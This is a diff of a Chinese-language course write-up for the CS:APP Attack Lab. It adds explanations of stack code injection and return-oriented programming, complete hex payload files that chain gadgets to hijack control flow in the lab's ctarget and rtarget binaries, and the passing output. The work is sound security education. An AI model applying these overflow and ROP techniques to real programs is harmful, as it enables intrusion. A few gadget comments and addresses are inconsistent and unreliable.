@@ -162,7 +162,7 @@ unsigned getbuf()
 }
 ```
 
-### Level 1
+### phase1
 
 phase1不会注入新的code，而是需要利用输入的字符串将程序重定向到执行另一块现有代码。
 
@@ -238,7 +238,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
 ```
 
-### Level 2
+### phase2
 
 phase2 需要注入一段攻击代码。
 
@@ -348,7 +348,11 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:2:48 C7 04 24 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
 ```
 
-### Level 3
+**可改进的地方：**
+
+`movq   $0x4017ec,(%rsp)`将touch2地址保存到栈中的操作，可用`pushq $0x4017ec`代替。
+
+### phase3
 
 level3 需要跳转到`touch3`, 并且传入一个字符串，调用`hexmatch`函数，检查该字符串值是否与cookie一致。
 
@@ -377,7 +381,7 @@ void touch3(char *sval)
 ```
 
 思路和level2类似，需要先跳转到注入代码，将字符串存储在栈上，将字符串地址传入`%rdi`后调用`touch3`。  
-字符串的内容为"59b997fa", 对应的ascii码值为`0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61`
+字符串的内容为"59b997fa", 对应的ascii码值为`0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61`，注意这边字符串在内存中存放的顺序，最低位应该是"5"，最高位是"a"，字符串是按顺序存放的。而不是像int型小端序存放，高位在高地址，低位在低地址。
 
 因此注入代码为：
 
@@ -390,3 +394,180 @@ ret
 ```
 
 ![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240720100747.png)
+
+需要注意的一个点是，字符串在栈中的存放位置必须在栈中touch3地址的上方，因为在执行`ret`跳转至`touch3`后，此时`%rsp`会指向touch3 entry上方地址，接下来进入`touch3`函数，会有一些压栈的动作，如果字符串保存在touch3 entry下方，那么就会被覆盖。
+
+**可改进的地方**：
+注入代码`movq $0x6166373939623935, %rax`先传立即数, 再将立即数压栈`pushq %rax`的方式有点繁琐了。  
+可直接将立即数通过注入代码，直接保存到栈中，再将栈地址传入`%rdi`是一样的效果。
+
+## Return-Oriented Programming
+
+RTARGET中启用了1.**栈随机化**，2.栈所在的内存是**nonexecutable**。  
+这导致了在CTARGET level2&3用到的注入代码技巧在RTARGET中无法使用。
+
+ROP要求我们从现有的代码中，找到我们需要的攻击代码(下图gadget)，利用ret来进行跳转。
+
+![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730200646.png)
+
+利用缓冲区溢出将栈上数据都替换成gadget code，这样第一次执行ret后会跳转到gadget1 code，再通过gadget1最后的ret(c3)跳转到gadget2 code。每个gadget code最后都需要包含ret(c3)来跳转。
+
+一些指令对应的二进制编码：
+
+ret `0xc3`
+nop `0x90`
+
+![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730212039.png)
+
+![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730221223.png)
+
+### phase4
+
+利用ROP技术实现CTARGET中的phase2。需要实现的目标还是一样，将cookie保存在`%rdi`中，然后跳转至`touch2`函数。
+
+首先反汇编RTARGET`objdump -d rtarget > rtarget.txt`。  
+根据讲义中的提示，我们需要找的gadget在`start_farm`到`end_farm`之间。可以使用的指令有`movq`, `popq`, `ret`, `nop`。
+
+首先我们想要把cookie传入`%rdi`中，有两种方式，一种通过`movq $59b997fa %rdi`把立即数传入到`%rdi`中，但是在farm中并没有能找到cookie对应的值。  
+另一种方式想到通过`popq %rdi`将栈中预先保存的cookie值加载到`%rdi`中。对应的二进制代码为`5f`，但是在farm中仍然没有找到。想到先通过`popq %rax`将cookie保存到`%rax`，再`movq %rax, %rdi`把`%rax`的值存进`%rdi`。对应的二进制代码为`58`。
+
+可以在farm中找到对应的代码，地址为0x4019ab，`58 90 c3`，分别为`popq %rax`, `nop`, `ret`。
+
+```txt
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3        
+```
+
+再寻找`movq %rax, %rdi` `48 89 c7`, 找到地址0x4019c5的code`48 89 c7 90 c3`，分别为`movq %rax, %rdi`, `nop`, `ret`。
+
+```txt
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	ret    
+```
+
+最后ret到栈中保存的`touch2`入口地址，进入`touch2`函数。整个栈中的数据如图所示：
+
+![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730224416.png)
+
+因此最后的`phase4.txt`为：
+
+```txt
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 /* first 0x28 bytes non-overflow data don't matter */
+ab 19 40 00 00 00 00 00 /* gadget1 code address, code at address: popq %rax;nop;ret */
+fa 97 b9 59 00 00 00 00 /* cookie 0x59b997fa*/
+c5 19 40 00 00 00 00 00 /* gadget2 code2 address, code at address: movq %rax, %rdi;nop;ret */
+ec 17 40 00 00 00 00 00 /* touch2 entry */
+```
+
+终端打印成功信息：
+
+```shell
+.././hex2raw < phase4.txt > phase4-raw.txt # phase4-raw.txt for gdb debug
+.././hex2raw < phase4.txt | .././rtarget -q
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+
+### phase5
+
+目标与phase3相同，需要将cookie字符串地址传入`%rdi`, 并跳转到touch3。
+
+根据讲义中的指令编码
+
+```txt
+48 89 xx 	movq
+58~5f 		popq
+89 xx		movl
+20 xx		andb
+08 xx		orb
+38 xx		cmpb
+84 xx		testb
+90		nop
+c3		ret
+```
+
+在farm中可以找到和movq, popq, movl相关的指令有：
+
+```txt
+4019a2: 48 89 c7 c3	movq %rax, %rdi
+4019ab: 58 90 c3	popq %rax
+401a06:	48 89 e0 c3	movq %rsp, %rax
+4019a3: 89 c7 c3	movl %eax, %edi
+4019dd: 89 c2 90 c3	movl %eax, %edx
+401a07: 89 e0 c3	movl %esp, %eax
+401a13: 89 ce 90 90 c3	movl %ecx, %esi
+401a34:	89 d1 c8 c9 c3  movl %edx, %ecx
+```
+
+寻找一些对此题有用的指令，我们可以想到字符串肯定是要保存在栈中的，而栈的地址又是随机的，那么只能通过操作`%rsp`寄存器来获取栈地址了。
+
+发现0x401a03处有`48 89 e0 c3` `movq %rsp, %rax;ret`可以将栈地址保存到%rax。  
+但又迎来了一个问题，当%rsp地址保存的是cookie值时，执行`movq %rsp, %rax`确实可以将cookie字符串地址保存到%rax，再通过`movq %rax, %rdi`传入%rdi。  
+但执行`ret`后会跳转到以cookie值为地址的地方执行code，导致segement fault。
+
+</br>
+
+接下来的操作参考了https://www.viseator.com/2017/07/18/CS_APP_AttackLab/ , 发现在farm中有这样一个函数：
+
+```txt
+00000000004019d6 <add_xy>: 
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+```
+
+有了这个，我们就可以把`%rsp`的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。栈结构如下图所示：
+
+![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240801223519.png)
+
+偏移量为加载%rsp`movq %rsp, %rax`后到目标字符串的距离，4*8=0x20。
+
+注意目标字符串的地址需要比touch3高，原因见[phase3](###phase3)。
+
+最后的phase5.txt为：
+
+```txt
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 /* first 0x28 bytes non-overflow data don't matter */
+ab 19 40 00 00 00 00 00 /* gadget1 code address, code at address: popq %rax;nop;ret */
+20 00 00 00 00 00 00 00 /* offset */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
+34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
+06 1a 40 00 00 00 00 00 /* movl %rsp, %rax */
+a2 19 40 00 00 00 00 00 /* movl %rax, %rdi */
+d6 19 40 00 00 00 00 00 /* add_xy */
+a2 19 40 00 00 00 00 00 /* movl %rax, %rdi */
+fa 18 40 00 00 00 00 00 /* touch3 entry */
+35 39 62 39 39 37 66 61 /* cookie string according to "0x59b997fa"*/
+```
+
+最终终端打印为：
+
+```shell
+$ .././hex2raw < phase5.txt > phase5-raw.txt # for gdb debug, (gdb) r -q < phase5-raw.txt
+$ .././hex2raw < phase5.txt | .././rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+```
